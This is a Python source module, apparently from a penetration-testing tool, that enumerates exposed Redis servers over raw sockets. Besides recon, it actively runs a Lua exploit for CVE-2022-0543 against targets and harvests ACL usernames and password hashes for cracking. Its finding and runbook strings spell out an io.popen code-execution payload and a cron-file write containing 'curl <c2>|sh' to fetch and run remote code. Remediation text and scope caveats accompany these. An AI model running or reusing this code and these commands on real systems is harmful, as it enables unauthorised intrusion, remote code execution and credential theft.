"""Deep Redis enumeration (stdlib only).

Speaks the Redis serialization protocol (RESP) directly on a raw socket - no
redis-py. Airgapped, stdlib only.

  * **PING / INFO:** version, OS, role (always answerable on an open port).
  * **INFO WITHOUT authentication:** the discriminator. If `INFO` returns the server
    stats with no `AUTH`, the instance is exposed unauthenticated - anyone on the
    network reads every key and, because Redis lets a client rewrite `dir` +
    `dbfilename` and `SAVE`, usually escalates to arbitrary file write / RCE (SSH
    `authorized_keys`, a cron entry, a web shell, or a malicious module). A
    `-NOAUTH Authentication required` reply means auth is enforced (recce reports it
    reachable-but-locked, not a finding).
  * **CONFIG GET dir / dbfilename / requirepass / protected-mode:** confirms the
    write-primitive preconditions and the exposure cause.

Positive findings fold into the severity totals, the Vulnerabilities sheet, the
write-ups, a dedicated **Redis** tab, and the prove engine. Read-only: recce never
writes a key, rewrites the config, or calls SAVE.
"""
from __future__ import annotations

import socket

from ...core.models import Host, Port
from ..svccommon import finding_builder

_PORTS = (6379, 6380, 16379)
_DEFAULT_PORT = 6379
_TIMEOUT = 5.0
_MAX_REPLY = 512 * 1024            # INFO is a few KB; cap the read so a hostile or
                                  # confused peer can't make us buffer unbounded.
_MAX_DEPTH = 32


def is_redis(port: Port) -> bool:
    if port.portid in _PORTS:
        return True
    return "redis" in f"{port.service} {port.product}".lower()


# --- RESP (REdis Serialization Protocol) ----------------------------------------

class _Err(str):
    """A RESP error reply ('-NOAUTH ...'), distinguishable from a normal string."""


class _Incomplete(Exception):
    """The buffer doesn't yet hold a complete reply - read more bytes."""


def _parse(buf: bytes, i: int = 0, depth: int = 0):
    """Parse one RESP value at `buf[i:]`. Returns (value, next_index). Raises
    _Incomplete if more bytes are needed, ValueError on a malformed frame."""
    if depth > _MAX_DEPTH:
        raise ValueError("RESP nested too deep")
    if i >= len(buf):
        raise _Incomplete
    marker = buf[i:i + 1]
    nl = buf.find(b"\r\n", i)
    if nl == -1:
        raise _Incomplete
    line = buf[i + 1:nl].decode("utf-8", "replace")
    after = nl + 2
    if marker == b"+":                                 # simple string
        return line, after
    if marker == b"-":                                 # error
        return _Err(line), after
    if marker == b":":                                 # integer
        try:
            return int(line), after
        except ValueError:
            raise ValueError("bad RESP integer")
    if marker == b"$":                                 # bulk string
        try:
            n = int(line)
        except ValueError:
            raise ValueError("bad RESP bulk length")
        if n == -1:
            return None, after
        if n < 0 or n > _MAX_REPLY:
            raise ValueError("RESP bulk length out of range")
        end = after + n
        if end + 2 > len(buf):
            raise _Incomplete
        return buf[after:end].decode("utf-8", "replace"), end + 2
    if marker == b"*":                                 # array
        try:
            n = int(line)
        except ValueError:
            raise ValueError("bad RESP array length")
        if n == -1:
            return None, after
        if n < 0 or n > 1024:
            raise ValueError("RESP array length out of range")
        out, j = [], after
        for _ in range(n):
            val, j = _parse(buf, j, depth + 1)
            out.append(val)
        return out, j
    raise ValueError("unknown RESP marker")


def _command(sock: socket.socket, *args: str) -> bytes:
    """Encode a command as a RESP array of bulk strings and send it."""
    parts = [f"*{len(args)}\r\n".encode()]
    for a in args:
        b = a.encode("utf-8")
        parts.append(f"${len(b)}\r\n".encode() + b + b"\r\n")
    payload = b"".join(parts)
    sock.sendall(payload)
    return payload


def _read_reply(sock: socket.socket, timeout: float = _TIMEOUT):
    """Read bytes until one complete RESP reply parses, the peer closes, the cap is
    hit, or the socket goes idle. Returns the parsed value (or None)."""
    buf = b""
    sock.settimeout(timeout)
    # Allow a little headroom over _MAX_REPLY so a bulk string AT the cap can still
    # buffer its framing ($<len>\r\n ... \r\n) instead of truncating to None.
    while len(buf) < _MAX_REPLY + 64:
        try:
            val, _ = _parse(buf, 0)
            return val
        except _Incomplete:
            pass
        except ValueError:
            return None
        try:
            chunk = sock.recv(8192)
        except (socket.timeout, OSError):
            return None
        if not chunk:
            return None
        buf += chunk
    return None


def _info_dict(text: str) -> dict:
    """Parse an INFO bulk-string ('key:value' lines, '# Section' headers)."""
    out = {}
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        k, _, v = line.partition(":")
        out[k.strip()] = v.strip()
    return out


def _config_value(reply) -> str:
    """CONFIG GET returns a flat array [name, value, ...]; return the first value."""
    if isinstance(reply, list) and len(reply) >= 2:
        return str(reply[1])
    return ""


# --- live probe -----------------------------------------------------------------

# CVE-2022-0543 T2 SAFE proof-of-exploit. The T1 reflection ('if package.loadlib
# then 1 else 0') proves the primitive is REACHABLE from the sandbox; this script
# proves it is ACTUALLY EXPLOITABLE by loading a real lua .so via package.loadlib,
# invoking luaopen_os to materialise the os table, and reading two harmless
# environment fields (USER, date). No shell exec (never touches io.popen / os.execute),
# no writes, no persistent state change - all effects live inside the transient Lua
# state EVAL tears down at end of script. On hardened builds where loadlib returns nil
# for every path (no lua .so shipped, or the sandbox blocks it), the script returns
# an empty string and the finding stays at T1. Kept as a module-level constant so
# tests can wire the exact bytes without recce's own encoders.
_CVE_2022_0543_SAFE_PROOF = (
    "local paths={"
    "\"/lib/x86_64-linux-gnu/liblua5.1.so.0\","
    "\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\","
    "\"/usr/lib/liblua5.1.so.0\","
    "\"/lib/liblua5.1.so.0\","
    "\"/usr/lib64/liblua-5.1.so\","
    "\"/lib/x86_64-linux-gnu/liblua5.3.so.0\","
    "\"/usr/lib/x86_64-linux-gnu/liblua5.3.so.0\""
    "} "
    "if not package or not package.loadlib then return \"\" end "
    "for _,p in ipairs(paths) do "
    "local f=package.loadlib(p,\"luaopen_os\") "
    "if f then local ok,om=pcall(f) "
    "if ok and type(om)==\"table\" and om.getenv then "
    "local u=tostring(om.getenv(\"USER\") or \"?\") "
    "local d=\"?\" if om.date then d=tostring(om.date(\"!%Y-%m-%dT%H:%M:%SZ\")) end "
    "return \"lib=\"..p..\";USER=\"..u..\";DATE=\"..d end end end "
    "return \"\""
)


def _cve_2022_0543_safe_proof(sock: socket.socket, timeout: float) -> str:
    """T2 SAFE proof for CVE-2022-0543. Runs one EVAL that loads luaopen_os via
    package.loadlib and returns 'lib=<path>;USER=<user>;DATE=<iso>'. Returns "" when
    no known lua .so path resolves (hardened build) or the peer errors. Never raises."""
    try:
        _command(sock, "EVAL", _CVE_2022_0543_SAFE_PROOF, "0")
        reply = _read_reply(sock, timeout)
    except OSError:
        return ""
    if isinstance(reply, _Err) or not isinstance(reply, str):
        return ""
    # Only return when the script positively produced evidence (lib=... prefix). A
    # bare empty string means the script ran but every loadlib returned nil.
    return reply if reply.startswith("lib=") else ""


def _deep(sock, out: dict, info: dict, timeout: float) -> None:
    """Read-only deep enumeration on an unauthenticated Redis: which RCE primitives are
    actually reachable (MODULE LOAD, replication, write-to-disk), the ACL identity, and
    replication topology. Populates out[modules|module_load|acl_user|acl_default_nopass|
    replication|connected_slaves|master_host|persistence]. Never raises."""
    try:
        # role/replication topology (from INFO replication section already in `info`).
        out["role"] = info.get("role", out.get("role", ""))
        out["connected_slaves"] = info.get("connected_slaves", "")
        out["master_host"] = info.get("master_host", "")
        # MODULE LIST: if it returns (even an empty array) the MODULE command is enabled
        # -> MODULE LOAD of a malicious .so is a direct RCE primitive. A loaded 3rd-party
        # module is itself worth surfacing.
        _command(sock, "MODULE", "LIST")
        ml = _read_reply(sock, timeout)
        if isinstance(ml, list):
            out["module_load"] = True
            mods = []
            for entry in ml:
                if isinstance(entry, list):
                    for i in range(0, len(entry) - 1, 2):
                        if entry[i] == "name":
                            mods.append(str(entry[i + 1]))
            out["modules"] = mods
        elif isinstance(ml, _Err):
            out["module_load"] = False       # renamed/disabled (hardened)
        # ACL identity (Redis 6+): who are we, and does the default user need no password?
        _command(sock, "ACL", "WHOAMI")
        who = _read_reply(sock, timeout)
        if isinstance(who, str):
            out["acl_user"] = who
        _command(sock, "ACL", "LIST")
        acl = _read_reply(sock, timeout)
        if isinstance(acl, list):
            for line in acl:
                s = str(line)
                if s.startswith("user default") and "nopass" in s:
                    out["acl_default_nopass"] = True
        # ACL USERS + ACL GETUSER: harvest every configured username and the per-user
        # SHA-256 password hashes (hashcat -m 1400) that Redis stores in the
        # 'passwords' field of GETUSER's reply. Also captures flags (nopass, on/off) so
        # the credential-store feed can distinguish real accounts from disabled ones.
        # Never modifies anything - GETUSER is a pure read.
        _command(sock, "ACL", "USERS")
        users_reply = _read_reply(sock, timeout)
        if isinstance(users_reply, list):
            acl_users = []
            for name in users_reply:
                if not isinstance(name, str):
                    continue
                _command(sock, "ACL", "GETUSER", name)
                gu = _read_reply(sock, timeout)
                entry = {"user": name, "flags": [], "hashes": []}
                if isinstance(gu, list):
                    for i in range(0, len(gu) - 1, 2):
                        key = gu[i]
                        val = gu[i + 1]
                        if key == "flags" and isinstance(val, list):
                            entry["flags"] = [str(x) for x in val]
                        elif key == "passwords" and isinstance(val, list):
                            entry["hashes"] = [str(x) for x in val if x]
                acl_users.append(entry)
            out["acl_users"] = acl_users
        # CVE-2022-0543: the Debian/Ubuntu Redis package leaves package.loadlib reachable
        # from the Lua sandbox, giving unauth RCE via EVAL. A single passive probe reads
        # a boolean - we NEVER call loadlib itself - so the check is safe on hardened
        # builds too. -ERR / -NOSCRIPT / a renamed EVAL just leaves the flag unset.
        _command(sock, "EVAL",
                 "if package and package.loadlib then return 1 else return 0 end", "0")
        lua = _read_reply(sock, timeout)
        if isinstance(lua, int) and not isinstance(lua, bool):
            out["cve_2022_0543"] = (lua == 1)
            # T2 SAFE proof: if T1 reflection confirmed loadlib is reachable, actually
            # exercise the primitive with the safest possible payload - load luaopen_os
            # from a known lua .so and read os.getenv('USER') / os.date(). No shell
            # exec, no child process, no writes. If a real evidence string comes back,
            # the CVE is not just "reachable" but "actively exploitable" - upgrade the
            # finding's depth_tier to t2 in findings().
            if out["cve_2022_0543"]:
                ev = _cve_2022_0543_safe_proof(sock, timeout)
                if ev:
                    out["cve_2022_0543_evidence"] = ev
        # Persistence: RDB (save) or AOF (appendonly) enabled means the CONFIG-rewrite
        # file-write actually flushes to disk.
        out["persistence"] = bool((out.get("save") or "").strip()) or \
            (out.get("appendonly", "").lower() == "yes")
    except OSError:
        pass


def probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict:
    """Connect and (read-only) fingerprint a Redis endpoint. Returns
    {reachable, unauth, version, os, role, keys, dir, dbfilename, protected_mode,
     requirepass, ssl, modules, module_load, replication, acl_user, acl_users,
     cve_2022_0543, cve_2022_0543_evidence, persistence, error} - empty dict if
     not Redis / unreachable."""
    out: dict = {"reachable": False, "unauth": False}
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
    except OSError as e:
        return {"reachable": False, "error": str(e)}
    try:
        _command(sock, "PING")
        pong = _read_reply(sock, timeout)
        if pong is None:
            return {"reachable": False, "error": "no PING reply"}
        out["reachable"] = True
        # A plaintext PING against a TLS-only listener (6380) yields an error/garbage;
        # note it but still try INFO.
        _command(sock, "INFO")
        info = _read_reply(sock, timeout)
        if isinstance(info, _Err):
            # -NOAUTH / -ERR: auth enforced (or protected). Reachable but locked.
            out["error"] = str(info)
            if "NOAUTH" in str(info).upper() or "AUTH" in str(info).upper():
                out["auth_required"] = True
            return out
        if isinstance(info, str):
            d = _info_dict(info)
            # Only claim an unauthenticated Redis when the peer positively looks like
            # Redis (PONG to PING, or an INFO carrying redis_version) - so a non-Redis
            # service on 6379 that happens to emit a RESP-shaped reply is not a false
            # critical.
            if pong != "PONG" and not d.get("redis_version"):
                out["error"] = "not a Redis service (no PONG / redis_version)"
                return out
            out["unauth"] = True
            out["version"] = d.get("redis_version", "")
            out["os"] = d.get("os", "")
            out["role"] = d.get("role", "")
            out["mode"] = d.get("redis_mode", "")
            # Total keys across all keyspace db lines (db0:keys=N,...).
            keys = 0
            for k, v in d.items():
                if k.startswith("db") and "keys=" in v:
                    try:
                        keys += int(v.split("keys=")[1].split(",")[0])
                    except (ValueError, IndexError):
                        pass
            out["keys"] = keys
            # Config preconditions for the write-primitive (read-only GETs).
            for name, key in (("dir", "dir"), ("dbfilename", "dbfilename"),
                              ("requirepass", "requirepass"),
                              ("protected-mode", "protected_mode"),
                              ("save", "save"), ("appendonly", "appendonly")):
                _command(sock, "CONFIG", "GET", name)
                out[key] = _config_value(_read_reply(sock, timeout))
            _deep(sock, out, d, timeout)
        return out
    except OSError as e:
        out["error"] = str(e)
        return out
    finally:
        try:
            sock.close()
        except OSError:
            pass


def redis_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_redis(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "product": p.product or "", "version": p.version or ""})
    return out


# --- narratives + findings ------------------------------------------------------

_NARRATIVE = {
    "redis_unauth": (
        "The Redis instance accepts commands with no authentication - recce read the "
        "server's INFO without a credential. That is full read/write access to every "
        "key (dump or tamper with cached sessions, tokens, queues and app data). Worse, "
        "an unauthenticated client can rewrite `dir` + `dbfilename` and call SAVE to "
        "write an arbitrary file - the classic escalation to RCE: an SSH "
        "authorized_keys entry, a root cron job, a web shell in the docroot, or loading "
        "a malicious module. Require a strong password (requirepass / ACLs), enable "
        "protected-mode, and bind the listener to a trusted interface immediately."),
    "redis_version": (
        "The Redis build is old / end-of-life. Beyond the missing security fixes, "
        "several Lua-sandbox-escape and module-load RCE issues affect older lines - "
        "confirm the running version and upgrade."),
    "redis_cve_2022_0543": (
        "Redis is running a Debian/Ubuntu-packaged build that leaves package.loadlib "
        "reachable from the Lua sandbox. Any client that can send EVAL - and on this "
        "instance that is any client, because auth is not enforced - can load an "
        "arbitrary shared object and get code execution as the redis user. This is "
        "CVE-2022-0543; it is actively exploited by the Muhstik and Redigo botnets. "
        "Upgrade the distro's redis-server package (the fix is in the packaging, not "
        "upstream Redis) and enforce AUTH."),
    "redis_acl_users": (
        "Redis ACL enumeration returned every configured username together with the "
        "SHA-256 password hash Redis stores for each user. The hashes are directly "
        "feedable to hashcat -m 1400; the usernames feed the credential-spray "
        "targeting list. Rotate the exposed accounts, restrict ACL commands to admin "
        "users, and require authentication so ACL GETUSER is not reachable "
        "unauthenticated."),
}


TESTING_NARRATIVE = [
    ("1. Handshake (stdlib RESP)",
     "recce speaks the Redis wire protocol directly - no redis-py. It sends PING and "
     "reads the +PONG to confirm the service."),
    ("2. Unauthenticated access test",
     "It runs INFO with no credential. If the server stats come back, the instance is "
     "exposed unauthenticated (critical); a -NOAUTH reply means auth is enforced "
     "(reachable but locked - not a finding)."),
    ("3. Write-primitive preconditions",
     "On an exposed instance it reads (never sets) CONFIG dir / dbfilename / "
     "requirepass / protected-mode - the settings an attacker would rewrite to turn "
     "read/write into arbitrary file write / RCE."),
    ("4. Runbook",
     "The exact follow-on commands (redis-cli INFO, KEYS *, the CONFIG SET dir + SAVE "
     "file-write chain, nmap redis-info) are staged per endpoint."),
]


_finding = finding_builder("redis", _NARRATIVE)


def _old_version(ver: str) -> bool:
    try:
        parts = [int(x) for x in ver.split(".")[:2]]
        while len(parts) < 2:
            parts.append(0)              # "6" -> [6,0], else [6] < [6,0] is True
        return parts < [6, 0]                          # < 6.0 predates ACLs; EOL
    except (ValueError, IndexError):
        return False


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_redis(p):
                continue
            pr = probes.get((h.ip, p.portid)) or {}
            if not pr:
                continue
            tgt = f"{h.ip}:{p.portid}"
            ver = pr.get("version", "")
            if pr.get("unauth"):
                keys = pr.get("keys", 0)
                # Enumerate which RCE primitives are ACTUALLY reachable on this instance
                # (recce read the config read-only; it never invoked them).
                paths = []
                if pr.get("dir") or pr.get("dbfilename"):
                    persist = " and persistence is on" if pr.get("persistence") else ""
                    paths.append(f"CONFIG-rewrite file write (dir={pr.get('dir', '?')}, "
                                 f"dbfilename={pr.get('dbfilename', '?')}{persist}) -> "
                                 "SSH key / cron / webshell")
                if pr.get("module_load"):
                    paths.append("MODULE LOAD of a malicious .so (module command enabled)")
                if str(pr.get("role", "")).lower() == "master":
                    paths.append("SLAVEOF/replication payload (role=master)")
                rce = ""
                if paths:
                    rce = " Reachable RCE primitive(s): " + "; ".join(paths) + "."
                mods = pr.get("modules") or []
                mod_txt = (f" Loaded modules: {', '.join(mods[:6])}." if mods else "")
                out.append(_finding(
                    "critical", "Redis exposed without authentication", tgt,
                    "recce read INFO with no credential"
                    + (f" (version {ver})" if ver else "")
                    + (f"; keyspace holds {keys} key(s)" if keys else "")
                    + (f"; ACL identity '{pr.get('acl_user')}'" if pr.get("acl_user") else "")
                    + ". Full unauthenticated read/write access to every key."
                    + rce + mod_txt,
                    "redis-cli",
                    f"redis-cli -h {h.ip} -p {p.portid} INFO ; "
                    f"redis-cli -h {h.ip} -p {p.portid} KEYS '*'   # then the "
                    "CONFIG SET dir + dbfilename + SAVE file-write chain, MODULE LOAD, or "
                    "the SLAVEOF replication payload for RCE",
                    "Set a strong requirepass / ACL, enable protected-mode, disable or "
                    "rename CONFIG/SAVE/MODULE/SLAVEOF for untrusted clients, and bind to "
                    "a trusted interface only.",
                    ["CWE-306", "CWE-284"], kind="redis_unauth",
                    exploit_note=(
                        "redis-cli -h <ip> -p <port> --scan | head -50 ; "
                        "redis-cli -h <ip> -p <port> DUMP <key> ; only in scope: "
                        "CONFIG SET dir /var/spool/cron/crontabs; CONFIG SET "
                        "dbfilename root; SET x '\\n\\n* * * * * curl <c2>|sh\\n\\n'; "
                        "SAVE."),
                    depth_tier="t2"))
            if pr.get("cve_2022_0543") is True:
                # T2 SAFE proof: if the loadlib-actually-loads probe returned real
                # server-side evidence (USER + date + which lua .so path worked), the
                # CVE is not just reachable but actively exploitable - upgrade tier
                # from t1 to t2 and fold the captured evidence into the detail.
                cve_ev = pr.get("cve_2022_0543_evidence", "")
                cve_tier = "t2" if cve_ev else "t1"
                proof_txt = (
                    " SAFE proof-of-exploit (read-only, no shell exec): the module "
                    "loaded luaopen_os via package.loadlib and read the redis "
                    f"process environment - {cve_ev}."
                    if cve_ev else "")
                out.append(_finding(
                    "critical",
                    "Redis Lua sandbox escape (CVE-2022-0543) - unauth RCE",
                    tgt,
                    "recce ran a read-only Lua probe under EVAL and confirmed "
                    "package.loadlib is reachable inside the sandbox - the exact "
                    "primitive CVE-2022-0543 abuses to load an arbitrary .so and run "
                    "code as the redis user. This is the Debian/Ubuntu-packaged "
                    "vulnerability actively weaponised by the Muhstik and Redigo "
                    "botnets."
                    + (f" (version {ver})" if ver else "")
                    + proof_txt,
                    "redis-cli",
                    f"redis-cli -h {h.ip} -p {p.portid} EVAL "
                    "'local f=package.loadlib(\"/lib/x86_64-linux-gnu/liblua5.1.so.0\","
                    "\"luaopen_io\"); local io=f(); "
                    "return io.popen(\"id\"):read(\"*a\")' 0   # only within scope",
                    "Upgrade the distro's redis-server package (the fix ships in "
                    "packaging, not upstream Redis) and enforce AUTH.",
                    ["CWE-1188", "CWE-269"], kind="redis_cve_2022_0543",
                    exploit_note=(
                        "redis-cli -h <ip> -p <port> EVAL 'local "
                        "f=package.loadlib(\"/lib/x86_64-linux-gnu/liblua5.1.so.0\","
                        "\"luaopen_io\"); local io=f(); return "
                        "io.popen(\"id\"):read(\"*a\")' 0 - only within engagement "
                        "scope."),
                    depth_tier=cve_tier))
            acl_users = pr.get("acl_users") or []
            hashed = [u for u in acl_users
                      if isinstance(u, dict) and u.get("hashes")]
            if hashed:
                names = ", ".join(u["user"] for u in hashed[:6])
                total_hashes = sum(len(u["hashes"]) for u in hashed)
                out.append(_finding(
                    "medium",
                    "Redis ACL user list and password hashes reachable", tgt,
                    f"recce read ACL USERS and ACL GETUSER without a credential and "
                    f"harvested {len(hashed)} user(s) with SHA-256 password hashes "
                    f"({total_hashes} hash(es); users: {names}). The hashes are "
                    "feedable to hashcat -m 1400; the usernames feed a targeted "
                    "credential-spray list.",
                    "redis-cli",
                    f"redis-cli -h {h.ip} -p {p.portid} ACL USERS ; "
                    f"redis-cli -h {h.ip} -p {p.portid} ACL GETUSER <user>",
                    "Enforce authentication so ACL commands are not reachable "
                    "unauthenticated, restrict ACL to admin users, and rotate any "
                    "exposed account passwords.",
                    ["CWE-200", "CWE-916"], kind="redis_acl_users"))
            if ver and _old_version(ver):
                out.append(_finding(
                    "medium", "Redis end-of-life / legacy build", tgt,
                    f"Redis {ver} predates the 6.0 ACL line and is past end-of-life - "
                    "missing security fixes (incl. Lua-sandbox / module-load RCEs).",
                    "redis-cli",
                    f"redis-cli -h {h.ip} -p {p.portid} INFO server",
                    "Upgrade to a supported Redis release.",
                    ["CWE-1104"], kind="redis_version"))
    return out


# --- runbook + proof + analyze --------------------------------------------------

def runbook(ip: str, port: int) -> list[dict]:
    steps = [
        ("recon", "nmap NSE", f"nmap -p{port} --script redis-info {ip}",
         "Server info (confirms unauth if it answers)."),
        ("enumerate", "redis-cli", f"redis-cli -h {ip} -p {port} INFO ; "
         f"redis-cli -h {ip} -p {port} KEYS '*'",
         "Read server stats and every key without a credential."),
        ("loot", "redis-cli", f"redis-cli -h {ip} -p {port} --scan | head ; "
         f"redis-cli -h {ip} -p {port} DUMP <key>",
         "Enumerate and dump keys (sessions, tokens, cached data)."),
        ("escalate", "CONFIG + SAVE", f"redis-cli -h {ip} -p {port} CONFIG SET dir "
         "/var/lib/redis ; ... CONFIG SET dbfilename x ; ... SAVE   # authorized_keys "
         "/ cron / webshell file-write -> RCE (only within scope)",
         "Turn read/write into arbitrary file write / code execution."),
    ]
    return [{"phase": ph, "tool": t, "command": c, "why": w}
            for ph, t, c, w in steps]


def proof_html(command, output, banner: str = "") -> str:
    from . import mssql
    return mssql.proof_html(command, output, prompt="> ", banner=banner)


def findings_to_vulns(fs: list[dict]) -> dict:
    from ..svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "redis", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    """Full Redis analysis. Returns {targets, findings, runbooks, probes, stats}.
    `budget` caps wall-clock seconds; `progress(i, n, target)` fires per probe."""
    from .. import svcprobe
    targets = redis_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["unauth"] = pr.get("unauth", False)
                t["version"] = pr.get("version", "") or t.get("version", "")
                t["keys"] = pr.get("keys", 0)
                t["auth_required"] = pr.get("auth_required", False)
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
